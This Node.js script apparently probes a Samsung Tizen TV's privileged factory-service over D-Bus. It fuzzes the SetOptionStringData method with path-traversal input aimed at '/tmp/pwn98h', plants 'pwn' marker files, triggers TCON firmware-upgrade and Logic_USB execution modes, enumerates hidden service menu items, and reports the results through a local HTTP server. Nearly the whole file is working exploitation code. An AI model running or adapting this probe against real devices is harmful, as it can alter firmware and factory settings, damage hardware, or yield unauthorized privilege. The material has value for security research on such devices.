'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8187;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe98h.txt';
var PWN = '/tmp/pwn98h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. Pre-create pwn target file
  'try { fs.writeFileSync("' + PWN + '", "pre\\n"); r.pwn_ok = true; } catch(e) {}',

  // 2. D-Bus Introspect /TIFacSerObj - get full interface list
  'try {',
  '  var o_intr = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.freedesktop.DBus.Introspectable.Introspect"],{timeout:5000});',
  '  r.introspect_xml = (o_intr.stdout||new Buffer(0)).toString().trim().slice(0,5000);',
  '} catch(e) { r.introspect_err = e.message.slice(0,60); }',

  // 3. D-Bus Properties.GetAll
  'try {',
  '  var o_ga = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.freedesktop.DBus.Properties.GetAll","org.tizen.tv.factoryservice"],{timeout:5000});',
  '  r.dbus_props_all = (o_ga.stdout||new Buffer(0)).toString().trim().slice(0,2000);',
  '} catch(e) { r.dbus_props_err = e.message.slice(0,60); }',

  // 4. SetOptionStringData(0) tests — try various strings to find accepted format
  'r.k0_set_tests = {};',
  // Test 1: short alpha only
  'try {',
  '  var o_t1 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData","0","AAAA","4"],{timeout:4000});',
  '  r.k0_set_tests.alpha4 = (o_t1.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '} catch(e) {}',
  // Test 2: original model number format
  'try {',
  '  var o_t2 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData","0","55A1AU0QN","9"],{timeout:4000});',
  '  r.k0_set_tests.original_format = (o_t2.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '} catch(e) {}',
  // Test 3: with dot
  'try {',
  '  var o_t3 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData","0","A.B","3"],{timeout:4000});',
  '  r.k0_set_tests.with_dot = (o_t3.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '} catch(e) {}',
  // Test 4: with slash
  'try {',
  '  var o_t4 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData","0","A/B","3"],{timeout:4000});',
  '  r.k0_set_tests.with_slash = (o_t4.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '} catch(e) {}',
  // Test 5: path traversal (no shell metacharacters)
  'try {',
  '  var ptrav = "../../../../tmp/pwn98h";',
  '  var o_t5 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData","0",ptrav,String(ptrav.length)],{timeout:4000});',
  '  r.k0_set_tests.path_traversal = (o_t5.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '} catch(e) {}',
  // Read back k0 to see what stuck
  'try {',
  '  var o_gk0 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetOptionStringData","0"],{timeout:3000});',
  '  r.k0_current = (o_gk0.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '} catch(e) {}',

  // 5. SetParameter(0, N) tests — try changing model index
  'r.k0_setparam_tests = {};',
  'for (var sp = 0; sp <= 5; sp++) {',
  '  try {',
  '    var o_sp0 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetParameter","0",String(sp)],{timeout:3000});',
  '    var sp_out = (o_sp0.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '    r.k0_setparam_tests["p"+sp] = sp_out;',
  '    if (sp_out === "((0,),)") {',
  '      var o_gk0b = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetOptionStringData","0"],{timeout:3000});',
  '      r.k0_setparam_tests["p"+sp+"_val"] = (o_gk0b.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '    }',
  '  } catch(e) {}',
  '}',

  // 6. If path_traversal worked: pre-create /tmp/pwn98h.bin and trigger TCON upgrade mode 2
  'var dm_base = 0;',
  'try { dm_base = cp.spawnSync("dmesg",[],{timeout:3000}).stdout.toString().split("\\n").length; } catch(e) {}',
  // Pre-create the traversal target file
  'try { fs.writeFileSync("/tmp/pwn98h.bin", "TCON_INJECT_TEST\\n"); r.tcon_target_created = true; } catch(e) { r.tcon_target_err = e.message.slice(0,60); }',
  // Try TCON upgrade mode 2 regardless (use current k0 value)
  'try {',
  '  var o_sp2 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetParameter","10804","2"],{timeout:3000});',
  '  r.tcon_setparam2 = (o_sp2.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '} catch(e) {}',
  'try {',
  '  var o_tce = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes","10804","0"],{timeout:12000});',
  '  r.tcon_exec_mode2 = (o_tce.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '} catch(e) {}',
  'try {',
  '  var dm_tcon = cp.spawnSync("dmesg",[],{timeout:3000}).stdout.toString().split("\\n");',
  '  r.tcon_mode2_dmesg = dm_tcon.slice(dm_base).join("\\n").slice(0,2000);',
  '  dm_base = dm_tcon.length;',
  '} catch(e) {}',

  // 7. Logic_USB (90804) with fresh dmesg capture
  'try {',
  '  var o_lsp = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetParameter","90804","1"],{timeout:3000});',
  '  r.logic_setparam = (o_lsp.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '} catch(e) {}',
  'try {',
  '  var o_lue = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes","90804","0"],{timeout:15000});',
  '  r.logic_usb_exec = (o_lue.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '} catch(e) {}',
  'try {',
  '  var dm_lu = cp.spawnSync("dmesg",[],{timeout:3000}).stdout.toString().split("\\n");',
  '  r.logic_usb_dmesg = dm_lu.slice(dm_base).join("\\n").slice(0,2000);',
  '  dm_base = dm_lu.length;',
  '} catch(e) {}',

  // 8. Read /opt subdirectories for SaveLog output
  'r.opt_dirs = {};',
  'var opt_subdirs = ["data","systemrw","dbspace","share","var"];',
  'opt_subdirs.forEach(function(d) {',
  '  try { r.opt_dirs[d] = fs.readdirSync("/opt/"+d).slice(0,30); } catch(e) { r.opt_dirs[d] = "ERR:"+e.message.slice(0,40); }',
  '});',

  // 9. GetChildItem(6, 31..64) - more Deleted menu items
  'r.deleted_31_64 = [];',
  'for (var i = 31; i <= 64; i++) {',
  '  try {',
  '    var o_del = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetChildItem","6",String(i)],{timeout:3000});',
  '    r.deleted_31_64.push({ idx: i, data: (o_del.stdout||new Buffer(0)).toString().trim().slice(0,200) });',
  '  } catch(e) {}',
  '}',

  // 10. GetChildItem(8) for Advanced menu (val1=1000000026, 0 children)
  //     AND try GetChildItem with other root items k9..k11
  'r.advanced_children = [];',
  'for (var ia = 0; ia < 10; ia++) {',
  '  try {',
  '    var o_adv = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetChildItem","8",String(ia)],{timeout:3000});',
  '    r.advanced_children.push({ idx: ia, data: (o_adv.stdout||new Buffer(0)).toString().trim().slice(0,200) });',
  '  } catch(e) {}',
  '}',

  // 11. /tmp/pwn98h.bin check - did TIFSDaemon read/touch it?
  'try {',
  '  var pbin_st = fs.statSync("/tmp/pwn98h.bin");',
  '  r.pwn_bin_stat = { size: pbin_st.size, atime: pbin_st.atime, mtime: pbin_st.mtime };',
  '  r.pwn_bin_content = fs.readFileSync("/tmp/pwn98h.bin","utf8").trim().slice(0,100);',
  '} catch(e) { r.pwn_bin_err = e.message.slice(0,60); }',

  // 12. Restore k0 to original model number
  'try {',
  '  var o_restore = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData","0","55A1AU0QN","9"],{timeout:4000});',
  '  r.k0_restored = (o_restore.stdout||new Buffer(0)).toString().trim().slice(0,80);',
  '} catch(e) {}',

  // 13. Final dmesg + pwn check
  'try {',
  '  var dm_fin = cp.spawnSync("dmesg",[],{timeout:3000});',
  '  r.dmesg_tail20 = (dm_fin.stdout||new Buffer(0)).toString().split("\\n").slice(-20).join("\\n").slice(0,1500);',
  '} catch(e) {}',
  'try { r.pwn_final = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) {}',

  'var out = JSON.stringify(r,null,2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '",out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 180000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
